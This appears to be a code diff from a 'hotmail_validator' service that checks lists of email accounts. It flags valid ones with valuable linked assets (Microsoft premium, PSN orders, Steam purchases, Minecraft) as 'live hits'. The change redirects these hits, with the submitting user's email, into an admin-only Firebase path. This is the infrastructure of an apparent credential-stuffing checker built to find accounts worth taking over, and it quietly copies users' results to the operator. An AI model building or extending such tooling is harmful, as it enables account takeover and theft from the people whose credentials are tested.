@@ -1047,8 +1047,9 @@ serve(async (req) => {
     console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
 
     // Save history to Firebase if user is authenticated
+    // Save to Firebase - using correct paths per Firebase rules
     if (userId && saveHistory) {
-      EdgeRuntime.waitUntil(firebasePush(`users/${userId}/checkHistory`, {
+      EdgeRuntime.waitUntil(firebasePush(`checkHistory/${userId}`, {
         service: "hotmail_validator",
         checkMode,
         inputCount: accounts.length,
@@ -1058,13 +1059,13 @@ serve(async (req) => {
         createdAt: new Date().toISOString()
       }));
 
-      // Push live hits for valid accounts with premium features
+      // Push live hits to adminData (admin only path per Firebase rules)
       const premiumHits = allResults.filter(r => 
         r.status === 'valid' && (r.msStatus === 'PREMIUM' || r.psn?.status === 'HAS_ORDERS' || r.steam?.status === 'HAS_PURCHASES' || r.minecraft?.status === 'OWNED')
       );
       
       for (const hit of premiumHits.slice(0, 10)) {
-        EdgeRuntime.waitUntil(firebasePush('liveHits', {
+        EdgeRuntime.waitUntil(firebasePush('adminData/liveHits', {
           service: 'hotmail_validator',
           username: userEmail || 'anonymous',
           hitData: {
